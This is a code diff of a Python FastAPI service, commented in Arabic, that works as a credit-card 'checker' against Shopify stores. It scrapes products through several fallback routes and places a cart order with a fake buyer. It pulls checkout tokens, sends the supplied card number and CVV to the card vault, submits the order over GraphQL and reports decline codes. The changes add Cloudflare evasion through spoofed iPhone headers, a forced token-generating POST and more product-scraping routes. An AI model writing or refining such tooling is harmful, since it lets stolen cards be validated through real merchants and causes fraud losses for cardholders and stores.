@@ -9,7 +9,7 @@ from html import unescape
 from urllib.parse import urlparse
 import urllib3
 
-# إخفاء تحذيرات SSL
+# إخفاء تحذيرات SSL لعدم كشف البوت
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 app = FastAPI()
@@ -26,36 +26,69 @@ def safe_response(msg, price, gate="Shopify"):
     clean_price = str(price).replace('$', '').strip() if price else "-"
     return {"Response": clean_msg, "Price": clean_price, "Gate": gate}
 
-def extract_product_smart(session, store_url):
-    """محرك سحب المنتجات الذكي والمضمون"""
-    endpoints = [f"{store_url}/products.json?limit=250", f"{store_url}/collections/all/products.json?limit=250"]
-    for ep in endpoints:
+def fetch_product_beast(session, store_url):
+    """محرك الوحش: 5 مسارات مختلفة لسحب المنتج لضمان عدم توقف الفحص أبدًا"""
+    def extract_vid(data):
+        products = data.get('products', []) if isinstance(data, dict) else (data if isinstance(data, list) else [])
+        valid = []
+        for p in products:
+            for v in p.get('variants', []):
+                if v.get('available', True):
+                    try:
+                        price = float(v.get('price', 0))
+                        if price > 10000: price /= 100.0
+                        if price > 0: valid.append((str(v.get('id')), price))
+                    except: pass
+        if valid:
+            valid.sort(key=lambda x: x[1])
+            return valid[0][0], "{:.2f}".format(valid[0][1])
+        return None, None
+
+    # 1 & 2: JSON APIs
+    for ep in [f"{store_url}/products.json?limit=250", f"{store_url}/collections/all/products.json?limit=250"]:
         try:
             r = session.get(ep, timeout=10, verify=False)
             if r.status_code == 200:
-                data = r.json()
-                products = data.get('products', []) if isinstance(data, dict) else (data if isinstance(data, list) else [])
-                valid_variants = []
-                for p in products:
-                    for v in p.get('variants', []):
-                        if v.get('available'):
-                            try:
-                                price = float(v.get('price', 0))
-                                if price > 10000: price /= 100.0
-                                if price > 0: valid_variants.append((str(v.get('id')), price))
-                            except: pass
-                if valid_variants:
-                    valid_variants.sort(key=lambda x: x[1])
-                    return valid_variants[0][0], "{:.2f}".format(valid_variants[0][1])
-        except: continue
+                vid, p = extract_vid(r.json())
+                if vid: return vid, p
+        except: pass
 
+    # 3: Sitemap Scanner
+    try:
+        r = session.get(f"{store_url}/sitemap_products_1.xml", timeout=10, verify=False)
+        if r.status_code == 200:
+            urls = re.findall(r'<loc>(.*?)</loc>', r.text)
+            handles = [u.split('/')[-1] for u in urls if '/products/' in u][:5]
+            for h in handles:
+                pr = session.get(f"{store_url}/products/{h}.js", timeout=10, verify=False)
+                if pr.status_code == 200:
+                    vid, p = extract_vid([pr.json()])
+                    if vid: return vid, p
+    except: pass
+
+    # 4: Search Suggest
+    try:
+        r = session.get(f"{store_url}/search/suggest.json?q=a&resources[type]=product", timeout=10, verify=False)
+        if r.status_code == 200:
+            res = r.json().get('resources', {}).get('results', {}).get('products', [])
+            for prod in res:
+                h = prod.get('handle')
+                if h:
+                    pr = session.get(f"{store_url}/products/{h}.js", timeout=10, verify=False)
+                    if pr.status_code == 200:
+                        vid, p = extract_vid([pr.json()])
+                        if vid: return vid, p
+    except: pass
+
+    # 5: HTML Force Scrape
     try:
         r = session.get(store_url, timeout=10, verify=False)
-        match = re.search(r'(?:variant_id|variantId)["\']?\s*:\s*["\']?(\d+)["\']?|variants\[0\]\.id\s*=\s*(\d+)', r.text, re.IGNORECASE)
+        match = re.search(r'(?:variant_id|variantId)["\']?\s*:\s*["\']?(\d+)["\']?|variants\[0\]\.id\s*=\s*(\d+)|"id":(\d{13,15})', r.text, re.IGNORECASE)
         if match:
-            vid = match.group(1) or match.group(2)
+            vid = match.group(1) or match.group(2) or match.group(3)
             if vid: return str(vid), "1.00"
     except: pass
+
     return None, "-"
 
 @app.get("/code/index.php")
@@ -73,15 +106,16 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
         proxies = {"http": format_proxy(proxy), "https": format_proxy(proxy)} if proxy else None
 
         buyer = {
-            "email": f"j.smith{random.randint(10000,99999)}@gmail.com", "first_name": "James", "last_name": "Smith",
+            "email": f"j.doe{random.randint(10000,99999)}@gmail.com", "first_name": "James", "last_name": "Smith",
             "address1": "4024 College Point Blvd", "city": "Flushing", "province": "NY", "zip": "11354", "country": "US", "phone": "2125551234"
         }
 
-        # الهيدرز الطبيعية لضمان تخطي Cloudflare
+        # استخدام هيدرز iPhone لتجنب تناقض البصمة مع Cloudflare (هذا ما سيحل مشكلة الموقع 27)
         headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-            'Accept-Language': 'en-US,en;q=0.5',
+            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Connection': 'keep-alive',
             'Upgrade-Insecure-Requests': '1'
         }
 
@@ -89,9 +123,9 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             if proxies: session.proxies.update(proxies)
             session.headers.update(headers)
 
-            # 1. سحب المنتج
-            variant_id, price = extract_product_smart(session, store_url)
-            if not variant_id: return JSONResponse(content=safe_response("No In-Stock Products Found", "-"))
+            # 1. سحب المنتج بأقوى دالة
+            variant_id, price = fetch_product_beast(session, store_url)
+            if not variant_id: return JSONResponse(content=safe_response("Product Out of Stock or Hidden", "-"))
 
             # 2. الإضافة للسلة
             session.headers.update({"X-Requested-With": "XMLHttpRequest", "Accept": "application/json"})
@@ -101,10 +135,10 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
 
             time.sleep(0.5)
 
-            # 3. فتح صفحة الدفع
+            # 3. فتح صفحة الدفع (السر هنا: طلب POST وليس GET لتوليد التوكن بالقوة وحل مشكلة الموقع 2)
             session.headers.pop("X-Requested-With", None)
-            session.headers.update({'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'})
-            res_chk = session.get(f"{store_url}/checkout", allow_redirects=True, verify=False)
+            session.headers.update({'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Content-Type': 'application/x-www-form-urlencoded'})
+            res_chk = session.post(f"{store_url}/cart", data={"checkout": "Checkout"}, allow_redirects=True, verify=False)
             html_chk = res_chk.text
             final_url = str(res_chk.url)
 
@@ -115,9 +149,9 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
                 return JSONResponse(content=safe_response("Store is Password Protected", price))
 
             if "/cart" in final_url and "/checkout" not in final_url:
-                return JSONResponse(content=safe_response("Redirected to Cart (Product OOS)", price))
+                return JSONResponse(content=safe_response("Redirected to Cart (Product Blocked)", price))
 
-            # 4. الرادار الجزيئي (Deep Scanner) - الحل لمشكلة Token Hidden
+            # 4. الرادار الجزيئي العميق (Deep Regex Scanner)
             is_graphql = False
             session_token, classic_token, checkout_token = None, None, None
 
@@ -125,30 +159,28 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             ct_match = re.search(r'/checkouts/(?:c|cn|unstable|c/graphql)/([^/?]+)', final_url)
             if ct_match: checkout_token = ct_match.group(1)
 
-            # استخراج Session Token (المتاجر الحديثة / Remix / React)
+            # استخراج Session Token
             meta_st = re.search(r'<meta\s+name="serialized-session-token"\s+content="([^"]+)"', html_chk)
+            js_st = re.search(r'["\']?sessionToken["\']?\s*:\s*["\']([^"\']+)["\']', html_chk, re.IGNORECASE)
+            
             if meta_st:
                 is_graphql = True
                 session_token = unescape(meta_st.group(1))
-            else:
-                # الحفر العميق داخل الجافاسكريبت
-                js_st = re.search(r'["\']?sessionToken["\']?\s*:\s*["\']([^"\']+)["\']', html_chk, re.IGNORECASE)
-                if js_st:
-                    is_graphql = True
-                    session_token = js_st.group(1)
+            elif js_st:
+                is_graphql = True
+                session_token = unescape(js_st.group(1))
 
             if is_graphql and not checkout_token:
                 js_ct = re.search(r'["\']?checkoutToken["\']?\s*:\s*["\']([^"\']+)["\']', html_chk, re.IGNORECASE)
                 if js_ct: checkout_token = js_ct.group(1)
                 else: checkout_token = "unknown"
 
-            # المتاجر الكلاسيكية ومتاجر Hydrogen
+            # المتاجر الكلاسيكية
             if not is_graphql:
                 patterns = [
                     r'name=["\']authenticity_token["\'][^>]*?value=["\']([^"\']+)["\']',
                     r'value=["\']([^"\']+)["\'][^>]*?name=["\']authenticity_token["\']',
-                    r'<meta\s+name=["\']csrf-token["\']\s+content=["\']([^"\']+)["\']',
-                    r'"csrfToken"\s*:\s*"([^"]+)"'  # للـ Hydrogen
+                    r'<meta\s+name=["\']csrf-token["\']\s+content=["\']([^"\']+)["\']'
                 ]
                 for p in patterns:
                     match = re.search(p, html_chk, re.IGNORECASE)
@@ -157,10 +189,7 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
                         break
 
             if not is_graphql and not classic_token:
-                # لو فشل بعد كل ده، نجيب اسم القالب عشان نعرف هو بيستخدم حماية إيه
-                theme = re.search(r'Shopify\.theme\s*=\s*\{"name":"([^"]+)"', html_chk)
-                theme_name = theme.group(1)[:15] if theme else "Unknown"
-                return JSONResponse(content=safe_response(f"Token Hidden ({theme_name})", price))
+                return JSONResponse(content=safe_response(f"Token Hidden (Try New Proxy)", price))
 
             # 5. تشفير البطاقة
             pci_headers = {"Origin": "https://checkout.pci.shopifyinc.com", "Content-Type": "application/json", "Accept": "application/json"}
@@ -169,12 +198,11 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             if res_pci.status_code != 200:
                 res_pci = session.post("https://deposit.us.shopifycs.com/sessions", json={"credit_card": {"number": cc_num, "month": mm, "year": yy, "verification_value": cvv, "name": buyer['first_name']}, "payment_session_scope": scope_host}, headers=pci_headers, verify=False)
 
-            if res_pci.status_code != 200: return JSONResponse(content=safe_response("Stripe Tokenization Blocked", price))
+            if res_pci.status_code != 200: return JSONResponse(content=safe_response("Stripe Payment Gate Blocked", price))
             card_session_id = res_pci.json().get("id")
-            if not card_session_id: return JSONResponse(content=safe_response("Failed to token card", price))
 
             # =================================================================
-            # المسار الأول: GraphQL Extensibility
+            # المسار الأول: GraphQL (Shopify 2026 Core Logic)
             # =================================================================
             if is_graphql and session_token:
                 if not checkout_token: checkout_token = "unknown"
@@ -192,7 +220,7 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
                 res_prop = session.post(gql_url, json={"operationName": "Proposal", "query": prop_query, "variables": prop_vars}, headers=gql_headers, verify=False)
                 queue_token = res_prop.json().get('data', {}).get('session', {}).get('negotiate', {}).get('result', {}).get('queueToken')
                 
-                if not queue_token: return JSONResponse(content=safe_response("Proposal Execution Failed (GQL)", price))
+                if not queue_token: return JSONResponse(content=safe_response("GraphQL Proposal Failed", price))
                 time.sleep(1)
 
                 sub_url = f"{store_url}/checkouts/unstable/graphql?operationName=SubmitForCompletion"
@@ -203,10 +231,10 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
                 sub_data = res_sub.json().get('data', {}).get('submitForCompletion', {})
                 if sub_data.get('__typename') == 'SubmitRejected':
                     errs = sub_data.get('errors', [])
-                    return JSONResponse(content=safe_response(errs[0].get('localizedMessage', 'Rejected by Shopify') if errs else 'Rejected by Shopify', price))
+                    return JSONResponse(content=safe_response(errs[0].get('localizedMessage', 'Rejected by System') if errs else 'Rejected by System', price))
                 
                 receipt_id = sub_data.get('receipt', {}).get('id')
-                if not receipt_id: return JSONResponse(content=safe_response("GraphQL Submit Failed", price))
+                if not receipt_id: return JSONResponse(content=safe_response("GraphQL Checkout Execution Failed", price))
 
                 poll_url = f"{store_url}/checkouts/unstable/graphql?operationName=PollForReceipt"
                 poll_query = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...on ProcessedReceipt{id}...on FailedReceipt{processingError{...on PaymentFailed{code messageUntranslated}...on OrderCreationFailure{paymentsHaveBeenReverted}}}}}"""
@@ -224,7 +252,7 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
                             elif "DO_NOT_HONOR" in err: return JSONResponse(content=safe_response("Do Not Honor", price))
                             return JSONResponse(content=safe_response(f"Declined: {err}", price))
                     time.sleep(1.5)
-                return JSONResponse(content=safe_response("Timeout waiting for Bank", price))
+                return JSONResponse(content=safe_response("Bank Processing Timeout", price))
 
             # =================================================================
             # المسار الثاني: الكلاسيكي (HTML Forms)
